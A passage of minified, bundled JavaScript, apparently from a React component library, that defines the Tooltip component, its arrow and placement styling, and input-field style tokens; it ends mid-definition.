  _excluded$6 = [
    "overlayClassName",
    "trigger",
    "mouseEnterDelay",
    "mouseLeaveDelay",
    "overlayStyle",
    "prefixCls",
    "children",
    "onVisibleChange",
    "afterVisibleChange",
    "transitionName",
    "animation",
    "motion",
    "placement",
    "align",
    "destroyTooltipOnHide",
    "defaultVisible",
    "getTooltipContainer",
    "overlayInnerStyle",
    "arrowContent",
    "overlay",
    "id",
    "showArrow",
  ],
  Tooltip$1 = function (a, o) {
    var s = a.overlayClassName,
      tt = a.trigger,
      nt = tt === void 0 ? ["hover"] : tt,
      ot = a.mouseEnterDelay,
      st = ot === void 0 ? 0 : ot,
      ft = a.mouseLeaveDelay,
      ht = ft === void 0 ? 0.1 : ft,
      gt = a.overlayStyle,
      St = a.prefixCls,
      vt = St === void 0 ? "rc-tooltip" : St,
      _t = a.children,
      Et = a.onVisibleChange,
      Ct = a.afterVisibleChange,
      Pt = a.transitionName,
      bt = a.animation,
      xt = a.motion,
      yt = a.placement,
      wt = yt === void 0 ? "right" : yt,
      $t = a.align,
      kt = $t === void 0 ? {} : $t,
      Rt = a.destroyTooltipOnHide,
      It = Rt === void 0 ? !1 : Rt,
      Ot = a.defaultVisible,
      Nt = a.getTooltipContainer,
      zt = a.overlayInnerStyle;
    a.arrowContent;
    var Bt = a.overlay,
      Wt = a.id,
      Gt = a.showArrow,
      Vt = Gt === void 0 ? !0 : Gt,
      Mt = _objectWithoutProperties$1(a, _excluded$6),
      Ft = reactExports.useRef(null);
    reactExports.useImperativeHandle(o, function () {
      return Ft.current;
    });
    var Tt = _objectSpread2$1({}, Mt);
    "visible" in a && (Tt.popupVisible = a.visible);
    var At = function () {
      return reactExports.createElement(
        Popup,
        { key: "content", prefixCls: vt, id: Wt, overlayInnerStyle: zt },
        Bt
      );
    };
    return reactExports.createElement(
      Trigger,
      _extends(
        {
          popupClassName: s,
          prefixCls: vt,
          popup: At,
          action: nt,
          builtinPlacements: placements,
          popupPlacement: wt,
          ref: Ft,
          popupAlign: kt,
          getPopupContainer: Nt,
          onPopupVisibleChange: Et,
          afterPopupVisibleChange: Ct,
          popupTransitionName: Pt,
          popupAnimation: bt,
          popupMotion: xt,
          defaultPopupVisible: Ot,
          autoDestroy: It,
          mouseLeaveDelay: ht,
          popupStyle: gt,
          mouseEnterDelay: st,
          arrow: Vt,
        },
        Tt
      ),
      _t
    );
  };
const Tooltip$2 = reactExports.forwardRef(Tooltip$1);
function getArrowToken(i) {
  const { sizePopupArrow: a, borderRadiusXS: o, borderRadiusOuter: s } = i,
    tt = a / 2,
    nt = 0,
    ot = tt,
    st = (s * 1) / Math.sqrt(2),
    ft = tt - s * (1 - 1 / Math.sqrt(2)),
    ht = tt - o * (1 / Math.sqrt(2)),
    gt = s * (Math.sqrt(2) - 1) + o * (1 / Math.sqrt(2)),
    St = 2 * tt - ht,
    vt = gt,
    _t = 2 * tt - st,
    Et = ft,
    Ct = 2 * tt - nt,
    Pt = ot,
    bt = tt * Math.sqrt(2) + s * (Math.sqrt(2) - 2),
    xt = s * (Math.sqrt(2) - 1),
    yt = `polygon(${xt}px 100%, 50% ${xt}px, ${
      2 * tt - xt
    }px 100%, ${xt}px 100%)`,
    wt = `path('M ${nt} ${ot} A ${s} ${s} 0 0 0 ${st} ${ft} L ${ht} ${gt} A ${o} ${o} 0 0 1 ${St} ${vt} L ${_t} ${Et} A ${s} ${s} 0 0 0 ${Ct} ${Pt} Z')`;
  return { arrowShadowWidth: bt, arrowPath: wt, arrowPolygon: yt };
}
const genRoundedArrow = (i, a, o) => {
    const {
      sizePopupArrow: s,
      arrowPolygon: tt,
      arrowPath: nt,
      arrowShadowWidth: ot,
      borderRadiusXS: st,
      calc: ft,
    } = i;
    return {
      pointerEvents: "none",
      width: s,
      height: s,
      overflow: "hidden",
      "&::before": {
        position: "absolute",
        bottom: 0,
        insetInlineStart: 0,
        width: s,
        height: ft(s).div(2).equal(),
        background: a,
        clipPath: { _multi_value_: !0, value: [tt, nt] },
        content: '""',
      },
      "&::after": {
        content: '""',
        position: "absolute",
        width: ot,
        height: ot,
        bottom: 0,
        insetInline: 0,
        margin: "auto",
        borderRadius: { _skip_check_: !0, value: `0 0 ${unit$1(st)} 0` },
        transform: "translateY(50%) rotate(-135deg)",
        boxShadow: o,
        zIndex: 0,
        background: "transparent",
      },
    };
  },
  MAX_VERTICAL_CONTENT_RADIUS = 8;
function getArrowOffsetToken(i) {
  const { contentRadius: a, limitVerticalRadius: o } = i,
    s = a > 12 ? a + 2 : 12;
  return {
    arrowOffsetHorizontal: s,
    arrowOffsetVertical: o ? MAX_VERTICAL_CONTENT_RADIUS : s,
  };
}
function isInject(i, a) {
  return i ? a : {};
}
function getArrowStyle(i, a, o) {
  const {
      componentCls: s,
      boxShadowPopoverArrow: tt,
      arrowOffsetVertical: nt,
      arrowOffsetHorizontal: ot,
    } = i,
    {
      arrowDistance: st = 0,
      arrowPlacement: ft = { left: !0, right: !0, top: !0, bottom: !0 },
    } = {};
  return {
    [s]: Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            {
              [`${s}-arrow`]: [
                Object.assign(
                  Object.assign(
                    { position: "absolute", zIndex: 1, display: "block" },
                    genRoundedArrow(i, a, tt)
                  ),
                  { "&:before": { background: a } }
                ),
              ],
            },
            isInject(!!ft.top, {
              [[
                `&-placement-top > ${s}-arrow`,
                `&-placement-topLeft > ${s}-arrow`,
                `&-placement-topRight > ${s}-arrow`,
              ].join(",")]: {
                bottom: st,
                transform: "translateY(100%) rotate(180deg)",
              },
              [`&-placement-top > ${s}-arrow`]: {
                left: { _skip_check_: !0, value: "50%" },
                transform: "translateX(-50%) translateY(100%) rotate(180deg)",
              },
              "&-placement-topLeft": {
                "--arrow-offset-horizontal": ot,
                [`> ${s}-arrow`]: { left: { _skip_check_: !0, value: ot } },
              },
              "&-placement-topRight": {
                "--arrow-offset-horizontal": `calc(100% - ${unit$1(ot)})`,
                [`> ${s}-arrow`]: { right: { _skip_check_: !0, value: ot } },
              },
            })
          ),
          isInject(!!ft.bottom, {
            [[
              `&-placement-bottom > ${s}-arrow`,
              `&-placement-bottomLeft > ${s}-arrow`,
              `&-placement-bottomRight > ${s}-arrow`,
            ].join(",")]: { top: st, transform: "translateY(-100%)" },
            [`&-placement-bottom > ${s}-arrow`]: {
              left: { _skip_check_: !0, value: "50%" },
              transform: "translateX(-50%) translateY(-100%)",
            },
            "&-placement-bottomLeft": {
              "--arrow-offset-horizontal": ot,
              [`> ${s}-arrow`]: { left: { _skip_check_: !0, value: ot } },
            },
            "&-placement-bottomRight": {
              "--arrow-offset-horizontal": `calc(100% - ${unit$1(ot)})`,
              [`> ${s}-arrow`]: { right: { _skip_check_: !0, value: ot } },
            },
          })
        ),
        isInject(!!ft.left, {
          [[
            `&-placement-left > ${s}-arrow`,
            `&-placement-leftTop > ${s}-arrow`,
            `&-placement-leftBottom > ${s}-arrow`,
          ].join(",")]: {
            right: { _skip_check_: !0, value: st },
            transform: "translateX(100%) rotate(90deg)",
          },
          [`&-placement-left > ${s}-arrow`]: {
            top: { _skip_check_: !0, value: "50%" },
            transform: "translateY(-50%) translateX(100%) rotate(90deg)",
          },
          [`&-placement-leftTop > ${s}-arrow`]: { top: nt },
          [`&-placement-leftBottom > ${s}-arrow`]: { bottom: nt },
        })
      ),
      isInject(!!ft.right, {
        [[
          `&-placement-right > ${s}-arrow`,
          `&-placement-rightTop > ${s}-arrow`,
          `&-placement-rightBottom > ${s}-arrow`,
        ].join(",")]: {
          left: { _skip_check_: !0, value: st },
          transform: "translateX(-100%) rotate(-90deg)",
        },
        [`&-placement-right > ${s}-arrow`]: {
          top: { _skip_check_: !0, value: "50%" },
          transform: "translateY(-50%) translateX(-100%) rotate(-90deg)",
        },
        [`&-placement-rightTop > ${s}-arrow`]: { top: nt },
        [`&-placement-rightBottom > ${s}-arrow`]: { bottom: nt },
      })
    ),
  };
}
function getOverflowOptions(i, a, o, s) {
  if (s === !1) return { adjustX: !1, adjustY: !1 };
  const tt = s && typeof s == "object" ? s : {},
    nt = {};
  switch (i) {
    case "top":
    case "bottom":
      (nt.shiftX = a.arrowOffsetHorizontal * 2 + o),
        (nt.shiftY = !0),
        (nt.adjustY = !0);
      break;
    case "left":
    case "right":
      (nt.shiftY = a.arrowOffsetVertical * 2 + o),
        (nt.shiftX = !0),
        (nt.adjustX = !0);
      break;
  }
  const ot = Object.assign(Object.assign({}, nt), tt);
  return ot.shiftX || (ot.adjustX = !0), ot.shiftY || (ot.adjustY = !0), ot;
}
const PlacementAlignMap = {
    left: { points: ["cr", "cl"] },
    right: { points: ["cl", "cr"] },
    top: { points: ["bc", "tc"] },
    bottom: { points: ["tc", "bc"] },
    topLeft: { points: ["bl", "tl"] },
    leftTop: { points: ["tr", "tl"] },
    topRight: { points: ["br", "tr"] },
    rightTop: { points: ["tl", "tr"] },
    bottomRight: { points: ["tr", "br"] },
    rightBottom: { points: ["bl", "br"] },
    bottomLeft: { points: ["tl", "bl"] },
    leftBottom: { points: ["br", "bl"] },
  },
  ArrowCenterPlacementAlignMap = {
    topLeft: { points: ["bl", "tc"] },
    leftTop: { points: ["tr", "cl"] },
    topRight: { points: ["br", "tc"] },
    rightTop: { points: ["tl", "cr"] },
    bottomRight: { points: ["tr", "bc"] },
    rightBottom: { points: ["bl", "cr"] },
    bottomLeft: { points: ["tl", "bc"] },
    leftBottom: { points: ["br", "cl"] },
  },
  DisableAutoArrowList = new Set([
    "topLeft",
    "topRight",
    "bottomLeft",
    "bottomRight",
    "leftTop",
    "leftBottom",
    "rightTop",
    "rightBottom",
  ]);
function getPlacements(i) {
  const {
      arrowWidth: a,
      autoAdjustOverflow: o,
      arrowPointAtCenter: s,
      offset: tt,
      borderRadius: nt,
      visibleFirst: ot,
    } = i,
    st = a / 2,
    ft = {};
  return (
    Object.keys(PlacementAlignMap).forEach((ht) => {
      const gt =
          (s && ArrowCenterPlacementAlignMap[ht]) || PlacementAlignMap[ht],
        St = Object.assign(Object.assign({}, gt), {
          offset: [0, 0],
          dynamicInset: !0,
        });
      switch (
        ((ft[ht] = St), DisableAutoArrowList.has(ht) && (St.autoArrow = !1), ht)
      ) {
        case "top":
        case "topLeft":
        case "topRight":
          St.offset[1] = -st - tt;
          break;
        case "bottom":
        case "bottomLeft":
        case "bottomRight":
          St.offset[1] = st + tt;
          break;
        case "left":
        case "leftTop":
        case "leftBottom":
          St.offset[0] = -st - tt;
          break;
        case "right":
        case "rightTop":
        case "rightBottom":
          St.offset[0] = st + tt;
          break;
      }
      const vt = getArrowOffsetToken({
        contentRadius: nt,
        limitVerticalRadius: !0,
      });
      if (s)
        switch (ht) {
          case "topLeft":
          case "bottomLeft":
            St.offset[0] = -vt.arrowOffsetHorizontal - st;
            break;
          case "topRight":
          case "bottomRight":
            St.offset[0] = vt.arrowOffsetHorizontal + st;
            break;
          case "leftTop":
          case "rightTop":
            St.offset[1] = -vt.arrowOffsetHorizontal * 2 + st;
            break;
          case "leftBottom":
          case "rightBottom":
            St.offset[1] = vt.arrowOffsetHorizontal * 2 - st;
            break;
        }
      (St.overflow = getOverflowOptions(ht, vt, a, o)),
        ot && (St.htmlRegion = "visibleFirst");
    }),
    ft
  );
}
const genTooltipStyle = (i) => {
    const {
        calc: a,
        componentCls: o,
        tooltipMaxWidth: s,
        tooltipColor: tt,
        tooltipBg: nt,
        tooltipBorderRadius: ot,
        zIndexPopup: st,
        controlHeight: ft,
        boxShadowSecondary: ht,
        paddingSM: gt,
        paddingXS: St,
        arrowOffsetHorizontal: vt,
        sizePopupArrow: _t,
      } = i,
      Et = a(ot).add(_t).add(vt).equal(),
      Ct = a(ot).mul(2).add(_t).equal();
    return [
      {
        [o]: Object.assign(
          Object.assign(
            Object.assign(Object.assign({}, resetComponent(i)), {
              position: "absolute",
              zIndex: st,
              display: "block",
              width: "max-content",
              maxWidth: s,
              visibility: "visible",
              "--valid-offset-x":
                "var(--arrow-offset-horizontal, var(--arrow-x))",
              transformOrigin: [
                "var(--valid-offset-x, 50%)",
                "var(--arrow-y, 50%)",
              ].join(" "),
              "&-hidden": { display: "none" },
              "--antd-arrow-background-color": nt,
              [`${o}-inner`]: {
                minWidth: Ct,
                minHeight: ft,
                padding: `${unit$1(i.calc(gt).div(2).equal())} ${unit$1(St)}`,
                color: tt,
                textAlign: "start",
                textDecoration: "none",
                wordWrap: "break-word",
                backgroundColor: nt,
                borderRadius: ot,
                boxShadow: ht,
                boxSizing: "border-box",
              },
              [[
                "&-placement-topLeft",
                "&-placement-topRight",
                "&-placement-bottomLeft",
                "&-placement-bottomRight",
              ].join(",")]: { minWidth: Et },
              [[
                "&-placement-left",
                "&-placement-leftTop",
                "&-placement-leftBottom",
                "&-placement-right",
                "&-placement-rightTop",
                "&-placement-rightBottom",
              ].join(",")]: {
                [`${o}-inner`]: {
                  borderRadius: i.min(ot, MAX_VERTICAL_CONTENT_RADIUS),
                },
              },
              [`${o}-content`]: { position: "relative" },
            }),
            genPresetColor(i, (Pt, bt) => {
              let { darkColor: xt } = bt;
              return {
                [`&${o}-${Pt}`]: {
                  [`${o}-inner`]: { backgroundColor: xt },
                  [`${o}-arrow`]: { "--antd-arrow-background-color": xt },
                },
              };
            })
          ),
          { "&-rtl": { direction: "rtl" } }
        ),
      },
      getArrowStyle(i, "var(--antd-arrow-background-color)"),
      {
        [`${o}-pure`]: {
          position: "relative",
          maxWidth: "none",
          margin: i.sizePopupArrow,
        },
      },
    ];
  },
  prepareComponentToken$1 = (i) =>
    Object.assign(
      Object.assign(
        { zIndexPopup: i.zIndexPopupBase + 70 },
        getArrowOffsetToken({
          contentRadius: i.borderRadius,
          limitVerticalRadius: !0,
        })
      ),
      getArrowToken(
        merge(i, { borderRadiusOuter: Math.min(i.borderRadiusOuter, 4) })
      )
    ),
  useStyle$3 = function (i) {
    let a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !0;
    return genStyleHooks(
      "Tooltip",
      (s) => {
        const {
            borderRadius: tt,
            colorTextLightSolid: nt,
            colorBgSpotlight: ot,
          } = s,
          st = merge(s, {
            tooltipMaxWidth: 250,
            tooltipColor: nt,
            tooltipBorderRadius: tt,
            tooltipBg: ot,
          });
        return [genTooltipStyle(st), initZoomMotion(s, "zoom-big-fast")];
      },
      prepareComponentToken$1,
      { resetStyle: !1, injectStyle: a }
    )(i);
  },
  inverseColors = PresetColors.map((i) => `${i}-inverse`);
function isPresetColor(i) {
  return (arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !0)
    ? []
        .concat(
          _toConsumableArray(inverseColors),
          _toConsumableArray(PresetColors)
        )
        .includes(i)
    : PresetColors.includes(i);
}
function parseColor(i, a) {
  const o = isPresetColor(a),
    s = classNames({ [`${i}-${a}`]: a && o }),
    tt = {},
    nt = {};
  return (
    a && !o && ((tt.background = a), (nt["--antd-arrow-background-color"] = a)),
    { className: s, overlayStyle: tt, arrowStyle: nt }
  );
}
const PurePanel = (i) => {
  const {
      prefixCls: a,
      className: o,
      placement: s = "top",
      title: tt,
      color: nt,
      overlayInnerStyle: ot,
    } = i,
    { getPrefixCls: st } = reactExports.useContext(ConfigContext),
    ft = st("tooltip", a),
    [ht, gt, St] = useStyle$3(ft),
    vt = parseColor(ft, nt),
    _t = vt.arrowStyle,
    Et = Object.assign(Object.assign({}, ot), vt.overlayStyle),
    Ct = classNames(
      gt,
      St,
      ft,
      `${ft}-pure`,
      `${ft}-placement-${s}`,
      o,
      vt.className
    );
  return ht(
    reactExports.createElement(
      "div",
      { className: Ct, style: _t },
      reactExports.createElement("div", { className: `${ft}-arrow` }),
      reactExports.createElement(
        Popup,
        Object.assign({}, i, {
          className: gt,
          prefixCls: ft,
          overlayInnerStyle: Et,
        }),
        tt
      )
    )
  );
};
var __rest$7 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const InternalTooltip = reactExports.forwardRef((i, a) => {
    var o, s;
    const {
        prefixCls: tt,
        openClassName: nt,
        getTooltipContainer: ot,
        overlayClassName: st,
        color: ft,
        overlayInnerStyle: ht,
        children: gt,
        afterOpenChange: St,
        afterVisibleChange: vt,
        destroyTooltipOnHide: _t,
        arrow: Et = !0,
        title: Ct,
        overlay: Pt,
        builtinPlacements: bt,
        arrowPointAtCenter: xt = !1,
        autoAdjustOverflow: yt = !0,
      } = i,
      wt = !!Et,
      [, $t] = useToken(),
      {
        getPopupContainer: kt,
        getPrefixCls: Rt,
        direction: It,
      } = reactExports.useContext(ConfigContext),
      Ot = devUseWarning(),
      Nt = reactExports.useRef(null),
      zt = () => {
        var Yt;
        (Yt = Nt.current) === null || Yt === void 0 || Yt.forceAlign();
      };
    reactExports.useImperativeHandle(a, () => {
      var Yt;
      return {
        forceAlign: zt,
        forcePopupAlign: () => {
          Ot.deprecated(!1, "forcePopupAlign", "forceAlign"), zt();
        },
        nativeElement:
          (Yt = Nt.current) === null || Yt === void 0
            ? void 0
            : Yt.nativeElement,
      };
    });
    const [Bt, Wt] = useMergedState(!1, {
        value: (o = i.open) !== null && o !== void 0 ? o : i.visible,
        defaultValue:
          (s = i.defaultOpen) !== null && s !== void 0 ? s : i.defaultVisible,
      }),
      Gt = !Ct && !Pt && Ct !== 0,
      Vt = (Yt) => {
        var rr, ar;
        Wt(Gt ? !1 : Yt),
          Gt ||
            ((rr = i.onOpenChange) === null || rr === void 0 || rr.call(i, Yt),
            (ar = i.onVisibleChange) === null ||
              ar === void 0 ||
              ar.call(i, Yt));
      },
      Mt = reactExports.useMemo(() => {
        var Yt, rr;
        let ar = xt;
        return (
          typeof Et == "object" &&
            (ar =
              (rr =
                (Yt = Et.pointAtCenter) !== null && Yt !== void 0
                  ? Yt
                  : Et.arrowPointAtCenter) !== null && rr !== void 0
                ? rr
                : xt),
          bt ||
            getPlacements({
              arrowPointAtCenter: ar,
              autoAdjustOverflow: yt,
              arrowWidth: wt ? $t.sizePopupArrow : 0,
              borderRadius: $t.borderRadius,
              offset: $t.marginXXS,
              visibleFirst: !0,
            })
        );
      }, [xt, Et, bt, $t]),
      Ft = reactExports.useMemo(
        () => (Ct === 0 ? Ct : Pt || Ct || ""),
        [Pt, Ct]
      ),
      Tt = reactExports.createElement(
        ContextIsolator,
        { space: !0 },
        typeof Ft == "function" ? Ft() : Ft
      ),
      {
        getPopupContainer: At,
        placement: Lt = "top",
        mouseEnterDelay: jt = 0.1,
        mouseLeaveDelay: Dt = 0.1,
        overlayStyle: Ut,
        rootClassName: Ht,
      } = i,
      Kt = __rest$7(i, [
        "getPopupContainer",
        "placement",
        "mouseEnterDelay",
        "mouseLeaveDelay",
        "overlayStyle",
        "rootClassName",
      ]),
      qt = Rt("tooltip", tt),
      Qt = Rt(),
      Zt = i["data-popover-inject"];
    let Jt = Bt;
    !("open" in i) && !("visible" in i) && Gt && (Jt = !1);
    const er =
        reactExports.isValidElement(gt) && !isFragment(gt)
          ? gt
          : reactExports.createElement("span", null, gt),
      sr = er.props,
      nr =
        !sr.className || typeof sr.className == "string"
          ? classNames(sr.className, nt || `${qt}-open`)
          : sr.className,
      [tr, Xt, hr] = useStyle$3(qt, !Zt),
      cr = parseColor(qt, ft),
      yr = cr.arrowStyle,
      vr = Object.assign(Object.assign({}, ht), cr.overlayStyle),
      xr = classNames(
        st,
        { [`${qt}-rtl`]: It === "rtl" },
        cr.className,
        Ht,
        Xt,
        hr
      ),
      [Sr, or] = useZIndex("Tooltip", Kt.zIndex),
      mr = reactExports.createElement(
        Tooltip$2,
        Object.assign({}, Kt, {
          zIndex: Sr,
          showArrow: wt,
          placement: Lt,
          mouseEnterDelay: jt,
          mouseLeaveDelay: Dt,
          prefixCls: qt,
          overlayClassName: xr,
          overlayStyle: Object.assign(Object.assign({}, yr), Ut),
          getTooltipContainer: At || ot || kt,
          ref: Nt,
          builtinPlacements: Mt,
          overlay: Tt,
          visible: Jt,
          onVisibleChange: Vt,
          afterVisibleChange: St ?? vt,
          overlayInnerStyle: vr,
          arrowContent: reactExports.createElement("span", {
            className: `${qt}-arrow-content`,
          }),
          motion: {
            motionName: getTransitionName(
              Qt,
              "zoom-big-fast",
              i.transitionName
            ),
            motionDeadline: 1e3,
          },
          destroyTooltipOnHide: !!_t,
        }),
        Jt ? cloneElement(er, { className: nr }) : er
      );
    return tr(
      reactExports.createElement(zIndexContext.Provider, { value: or }, mr)
    );
  }),
  Tooltip = InternalTooltip;
Tooltip._InternalPanelDoNotUseOrYouWillBeFired = PurePanel;
function initInputToken(i) {
  return merge(i, { inputAffixPadding: i.paddingXXS });
}
const initComponentToken = (i) => {
    const {
      controlHeight: a,
      fontSize: o,
      lineHeight: s,
      lineWidth: tt,
      controlHeightSM: nt,
      controlHeightLG: ot,
      fontSizeLG: st,
      lineHeightLG: ft,
      paddingSM: ht,
      controlPaddingHorizontalSM: gt,
      controlPaddingHorizontal: St,
      colorFillAlter: vt,
      colorPrimaryHover: _t,
      colorPrimary: Et,
      controlOutlineWidth: Ct,
      controlOutline: Pt,
      colorErrorOutline: bt,
      colorWarningOutline: xt,
      colorBgContainer: yt,
    } = i;
    return {
      paddingBlock: Math.max(Math.round(((a - o * s) / 2) * 10) / 10 - tt, 0),
      paddingBlockSM: Math.max(
        Math.round(((nt - o * s) / 2) * 10) / 10 - tt,
        0
      ),
      paddingBlockLG: Math.ceil(((ot - st * ft) / 2) * 10) / 10 - tt,
      paddingInline: ht - tt,
      paddingInlineSM: gt - tt,
      paddingInlineLG: St - tt,
      addonBg: vt,
      activeBorderColor: Et,
      hoverBorderColor: _t,
      activeShadow: `0 0 0 ${Ct}px ${Pt}`,
      errorActiveShadow: `0 0 0 ${Ct}px ${bt}`,
      warningActiveShadow: `0 0 0 ${Ct}px ${xt}`,
      hoverBg: yt,
      activeBg: yt,
      inputFontSize: o,
      inputFontSizeLG: st,
      inputFontSizeSM: o,
    };
  },
  genHoverStyle = (i) => ({
    borderColor: i.hoverBorderColor,
    backgroundColor: i.hoverBg,
  }),
  genDisabledStyle = (i) => ({
    color: i.colorTextDisabled,
    backgroundColor: i.colorBgContainerDisabled,
    borderColor: i.colorBorder,
    boxShadow: "none",
    cursor: "not-allowed",
    opacity: 1,
    "input[disabled], textarea[disabled]": { cursor: "not-allowed" },
    "&:hover:not([disabled])": Object.assign(
      {},
      genHoverStyle(
        merge(i, {
          hoverBorderColor: i.colorBorder,
          hoverBg: i.colorBgContainerDisabled,
        })
      )
    ),
  }),
  genBaseOutlinedStyle = (i, a) => ({
    background: i.colorBgContainer,
    borderWidth: i.lineWidth,
    borderStyle: i.lineType,
    borderColor: a.borderColor,
    "&:hover": { borderColor: a.hoverBorderColor, backgroundColor: i.hoverBg },
    "&:focus, &:focus-within": {
      borderColor: a.activeBorderColor,
      boxShadow: a.activeShadow,
      outline: 0,
      backgroundColor: i.activeBg,
    },
  }),
  genOutlinedStatusStyle = (i, a) => ({
    [`&${i.componentCls}-status-${a.status}:not(${i.componentCls}-disabled)`]:
      Object.assign(Object.assign({}, genBaseOutlinedStyle(i, a)), {
        [`${i.componentCls}-prefix, ${i.componentCls}-suffix`]: {
          color: a.affixColor,
        },
      }),
    [`&${i.componentCls}-status-${a.status}${i.componentCls}-disabled`]: {
      borderColor: a.borderColor,
    },
  }),
  genOutlinedStyle = (i, a) => ({
    "&-outlined": Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              {},
              genBaseOutlinedStyle(i, {
                borderColor: i.colorBorder,
                hoverBorderColor: i.hoverBorderColor,
                activeBorderColor: i.activeBorderColor,
                activeShadow: i.activeShadow,
              })
            ),
            {
              [`&${i.componentCls}-disabled, &[disabled]`]: Object.assign(
                {},
                genDisabledStyle(i)
              ),
            }
          ),
          genOutlinedStatusStyle(i, {
            status: "error",
            borderColor: i.colorError,
            hoverBorderColor: i.colorErrorBorderHover,
            activeBorderColor: i.colorError,
            activeShadow: i.errorActiveShadow,
            affixColor: i.colorError,
          })
        ),
        genOutlinedStatusStyle(i, {
          status: "warning",
          borderColor: i.colorWarning,
          hoverBorderColor: i.colorWarningBorderHover,
          activeBorderColor: i.colorWarning,
          activeShadow: i.warningActiveShadow,
          affixColor: i.colorWarning,
        })
      ),
      a
    ),
  }),
  genOutlinedGroupStatusStyle = (i, a) => ({
    [`&${i.componentCls}-group-wrapper-status-${a.status}`]: {
      [`${i.componentCls}-group-addon`]: {
        borderColor: a.addonBorderColor,
        color: a.addonColor,
      },
    },
  }),
  genOutlinedGroupStyle = (i) => ({
    "&-outlined": Object.assign(
      Object.assign(
        Object.assign(
          {
            [`${i.componentCls}-group`]: {
              "&-addon": {
                background: i.addonBg,
                border: `${unit$1(i.lineWidth)} ${i.lineType} ${i.colorBorder}`,
              },
              "&-addon:first-child": { borderInlineEnd: 0 },
              "&-addon:last-child": { borderInlineStart: 0 },
            },
          },
          genOutlinedGroupStatusStyle(i, {
            status: "error",
            addonBorderColor: i.colorError,
            addonColor: i.colorErrorText,
          })
        ),
        genOutlinedGroupStatusStyle(i, {
          status: "warning",
          addonBorderColor: i.colorWarning,
          addonColor: i.colorWarningText,
        })
      ),
      {
        [`&${i.componentCls}-group-wrapper-disabled`]: {
          [`${i.componentCls}-group-addon`]: Object.assign(
            {},
            genDisabledStyle(i)
          ),
        },
      }
    ),
  }),
  genBorderlessStyle = (i, a) => {
    const { componentCls: o } = i;
    return {
      "&-borderless": Object.assign(
        {
          background: "transparent",
          border: "none",
          "&:focus, &:focus-within": { outline: "none" },
          [`&${o}-disabled, &[disabled]`]: {
            color: i.colorTextDisabled,
            cursor: "not-allowed",
          },
          [`&${o}-status-error`]: {
            "&, & input, & textarea": { color: i.colorError },
          },
          [`&${o}-status-warning`]: {
            "&, & input, & textarea": { color: i.colorWarning },
          },
        },
        a
      ),
    };
  },
  genBaseFilledStyle = (i, a) => ({
    background: a.bg,
    borderWidth: i.lineWidth,
    borderStyle: i.lineType,
    borderColor: "transparent",
    "input&, & input, textarea&, & textarea": {
      color: a == null ? void 0 : a.inputColor,
    },
    "&:hover": { background: a.hoverBg },
    "&:focus, &:focus-within": {
      outline: 0,
      borderColor: a.activeBorderColor,
      backgroundColor: i.activeBg,
    },
  }),
  genFilledStatusStyle = (i, a) => ({
    [`&${i.componentCls}-status-${a.status}:not(${i.componentCls}-disabled)`]:
      Object.assign(Object.assign({}, genBaseFilledStyle(i, a)), {
        [`${i.componentCls}-prefix, ${i.componentCls}-suffix`]: {
          color: a.affixColor,
        },
      }),
  }),
  genFilledStyle = (i, a) => ({
    "&-filled": Object.assign(
      Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              {},
              genBaseFilledStyle(i, {
                bg: i.colorFillTertiary,
                hoverBg: i.colorFillSecondary,
                activeBorderColor: i.activeBorderColor,
              })
            ),
            {
              [`&${i.componentCls}-disabled, &[disabled]`]: Object.assign(
                {},
                genDisabledStyle(i)
              ),
            }
          ),
          genFilledStatusStyle(i, {
            status: "error",
            bg: i.colorErrorBg,
            hoverBg: i.colorErrorBgHover,
            activeBorderColor: i.colorError,
            inputColor: i.colorErrorText,
            affixColor: i.colorError,
          })
        ),
        genFilledStatusStyle(i, {
          status: "warning",
          bg: i.colorWarningBg,
          hoverBg: i.colorWarningBgHover,
          activeBorderColor: i.colorWarning,
          inputColor: i.colorWarningText,
          affixColor: i.colorWarning,
        })
      ),
      a
    ),
  }),
  genFilledGroupStatusStyle = (i, a) => ({
    [`&${i.componentCls}-group-wrapper-status-${a.status}`]: {
      [`${i.componentCls}-group-addon`]: {
        background: a.addonBg,
        color: a.addonColor,
      },
    },
  }),
  genFilledGroupStyle = (i) => ({
    "&-filled": Object.assign(
      Object.assign(
        Object.assign(
          {
            [`${i.componentCls}-group`]: {
              "&-addon": { background: i.colorFillTertiary },
              [`${i.componentCls}-filled:not(:focus):not(:focus-within)`]: {
                "&:not(:first-child)": {
                  borderInlineStart: `${unit$1(i.lineWidth)} ${i.lineType} ${
                    i.colorSplit
                  }`,
                },
                "&:not(:last-child)": {
                  borderInlineEnd: `${unit$1(i.lineWidth)} ${i.lineType} ${
                    i.colorSplit
                  }`,
                },
              },
            },
          },
          genFilledGroupStatusStyle(i, {
            status: "error",
            addonBg: i.colorErrorBg,
            addonColor: i.colorErrorText,
          })
        ),
        genFilledGroupStatusStyle(i, {
          status: "warning",
          addonBg: i.colorWarningBg,
          addonColor: i.colorWarningText,
        })
      ),
      {
        [`&${i.componentCls}-group-wrapper-disabled`]: {
          [`${i.componentCls}-group`]: {
            "&-addon": {
              background: i.colorFillTertiary,
              color: i.colorTextDisabled,
            },
            "&-addon:first-child": {
              borderInlineStart: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
              borderTop: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
              borderBottom: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
            },
            "&-addon:last-child": {
              borderInlineEnd: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
              borderTop: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
              borderBottom: `${unit$1(i.lineWidth)} ${i.lineType} ${
                i.colorBorder
              }`,
            },
          },
        },
      }
    ),
  }),
  genPlaceholderStyle = (i) => ({
    "&::-moz-placeholder": { opacity: 1 },
    "&::placeholder": { color: i, userSelect: "none" },
